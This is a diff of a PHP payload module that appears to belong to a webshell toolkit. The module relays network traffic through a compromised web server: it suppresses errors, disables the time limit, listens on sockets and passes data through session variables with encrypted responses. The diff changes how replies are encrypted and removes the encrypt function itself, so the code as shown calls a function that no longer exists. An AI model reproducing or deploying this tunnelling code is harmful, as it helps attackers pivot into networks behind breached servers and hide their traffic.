@@ -1,3 +1,4 @@
+<?
 @error_reporting(0);
 @set_time_limit(0);
 function main($action, $listenPort = "", $socketHash = "", $extraData = "MTIz")
@@ -16,7 +17,7 @@ function main($action, $listenPort = "", $socketHash = "", $extraData = "MTIz")
             if (!$bind) {
                 $result["status"] = base64_encode("fail");
                 $result["msg"] = base64_encode(socket_strerror($serverSocket));
-                echo encrypt(json_encode($result), $_SESSION['k']);
+                echo encrypt(json_encode($result));
                 return;
             }
 
@@ -24,7 +25,7 @@ function main($action, $listenPort = "", $socketHash = "", $extraData = "MTIz")
             if (!$listen) {
                 $result["status"] = base64_encode("fail");
                 $result["msg"] = base64_encode(socket_strerror($listen));
-                echo encrypt(json_encode($result), $_SESSION['k']);
+                echo encrypt(json_encode($result));
                 return;
             }
             socket_set_nonblock($serverSocket);
@@ -118,7 +119,7 @@ function main($action, $listenPort = "", $socketHash = "", $extraData = "MTIz")
              session_write_close();
             $result["status"] = base64_encode("success");
             $result["msg"] = base64_encode(json_encode($socketList));
-            echo encrypt(json_encode($result), $_SESSION['k']);
+            echo encrypt(json_encode($result));
             return;
         case "read":
             $socketReadHash=$socketHash."_read";
@@ -127,10 +128,15 @@ function main($action, $listenPort = "", $socketHash = "", $extraData = "MTIz")
                 $readContent=$_SESSION[$socketReadHash];
                 $_SESSION[$socketReadHash]="";
                 session_write_close();
-                echo $readContent;
+                $result["status"] = base64_encode("success");
+                $result["msg"] = base64_encode(base64_encode($readContent));
+                echo encrypt(json_encode($result));
                 return;
             } else {
                 //echo "\x37\x21\x49\x36RemoteSocket read failed";
+                $result["status"] = base64_encode("fail");
+                $result["msg"] = base64_encode("error");
+                echo encrypt(json_encode($result));
                 return;
             }
         case "write":
@@ -141,9 +147,13 @@ function main($action, $listenPort = "", $socketHash = "", $extraData = "MTIz")
                 $_SESSION[$socketWriteHash]=$_SESSION[$socketWriteHash].$rawPostData;
                 session_write_close();
                 header("Connection: Keep-Alive");
+                $result["status"] = base64_encode("success");
+                $result["msg"] = base64_encode("ok");
             } else {
-                echo "\x37\x21\x49\x36RemoteSocket write failed";
+               $result["status"] = base64_encode("fail");
+               $result["msg"] = base64_encode("error");
             }
+            echo encrypt(json_encode($result));
             return;
         case "stop":
             $socketHashList = array();
@@ -166,27 +176,16 @@ function main($action, $listenPort = "", $socketHash = "", $extraData = "MTIz")
              session_write_close();
             $result["status"] = base64_encode("success");
             $result["msg"] = base64_encode("服务侧Socket资源已释放。");
-            echo encrypt(json_encode($result), $_SESSION['k']);
+            echo encrypt(json_encode($result));
             return;
         case "close":
             socket_close($_SESSION[$socketHash]);
             unset($_SESSION[$socketHash]);
             $result["status"] = base64_encode("success");
             $result["msg"] = base64_encode("服务侧Socket资源已释放。");
-            echo encrypt(json_encode($result), $_SESSION['k']);
+            echo encrypt(json_encode($result));
             return;
         default: {
             }
-    }
-}
-function encrypt($data, $key)
-{
-    if (!extension_loaded('openssl')) {
-        for ($i = 0; $i < strlen($data); $i++) {
-            $data[$i] = $data[$i] ^ $key[$i + 1 & 15];
-        }
-        return $data;
-    } else {
-        return openssl_encrypt($data, "AES128", $key);
     }
 }
